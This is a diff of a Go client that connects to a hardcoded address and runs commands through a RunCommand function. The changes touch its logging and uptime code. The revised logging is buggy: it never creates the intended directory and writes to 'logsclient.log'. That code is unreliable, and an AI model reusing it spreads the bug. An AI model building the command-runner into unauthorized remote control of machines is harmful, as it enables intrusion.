@@ -42,7 +42,6 @@ var (
 	sessionId       string
 	logStream       *log.Logger
 	logEnabled      bool      = false
-	logpath         string    = "logs/client.log"
 	address         string    = "10.0.0.127"
 	port            string    = "54678"
 	startTime       time.Time = time.Now().UTC()
@@ -130,11 +129,13 @@ type (
 
 func WriteLog(message string, v ...any) {
 	if logEnabled {
-		if err := os.MkdirAll(filepath.Dir(logpath), 0755); err != nil {
+		logpath := "logs"
+		err := os.MkdirAll(filepath.Dir(logpath), 0755)
+		if err != nil {
 			logEnabled = false
 			log.Fatalf("Failed to create log directory: %v", err)
 		}
-		file, err := os.OpenFile(logpath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		file, err := os.OpenFile(logpath+"client.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 		if err != nil {
 			logEnabled = false
 			log.Fatalf("Failed to open log file: %v", err)
@@ -146,7 +147,7 @@ func WriteLog(message string, v ...any) {
 		if len(v) > 0 {
 			message = fmt.Sprintf(message, v...)
 		}
-		logStream.Println(message)
+		logStream.Println("[" + time.Now().Format(time.RFC3339) + "] " + message)
 	}
 }
 
@@ -593,19 +594,15 @@ func RunCommand(command string, payload string, isFile bool) (string, error) {
 	return stdout.String(), nil
 }
 
-func FormatTime(milliseconds int64) string {
-	totalSeconds := milliseconds / 1000
+func GetUptime() string {
+	currentTime := time.Now()
+	uptimeMillis := currentTime.Sub(startTime).Milliseconds()
+	totalSeconds := uptimeMillis / 1000
 	days := totalSeconds / 86400
 	hours := (totalSeconds % 86400) / 3600
 	minutes := (totalSeconds % 3600) / 60
 	seconds := totalSeconds % 60
 	return fmt.Sprintf("%dd %dh %dm %ds", days, hours, minutes, seconds)
-}
-
-func GetUptime() string {
-	currentTime := time.Now()
-	uptimeMillis := currentTime.Sub(startTime).Milliseconds()
-	return FormatTime(uptimeMillis)
 }
 
 func ParseAction(action string) {
@@ -618,7 +615,6 @@ func ParseAction(action string) {
 			})
 		}
 	}()
-
 	action = strings.TrimSpace(action)
 	re := regexp.MustCompile(`(?:(?:"[^"]*")|(?:\S+))`)
 	parts := re.Split(action, -1)
